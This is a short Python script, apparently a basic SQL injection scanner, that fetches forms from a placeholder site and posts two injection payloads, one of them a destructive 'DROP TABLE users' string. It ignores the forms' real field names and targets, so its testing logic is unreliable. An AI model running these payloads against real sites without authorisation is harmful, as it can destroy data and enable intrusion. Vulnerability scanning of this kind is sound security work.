import requests
from bs4 import BeautifulSoup

# Define the target URL
url = "http://example.com"

# Function to crawl and find input fields
def crawl_and_find_inputs(target_url):
    response = requests.get(target_url)
    soup = BeautifulSoup(response.text, 'html.parser')
    forms = soup.find_all('form')
    return forms

# Function to test SQL Injection
def test_sql_injection(target_url, forms):
    payloads = ["' OR '1'='1", "'; DROP TABLE users; --"]
    for form in forms:
        for payload in payloads:
            # Add payload to form data and send request
            response = requests.post(target_url, data={"input_field": payload})
            if "SQL syntax" in response.text:
                print(f"Possible SQL Injection detected on {target_url}")

# Main function
def main():
    forms = crawl_and_find_inputs(url)
    test_sql_injection(url, forms)

if __name__ == "__main__":
    main()
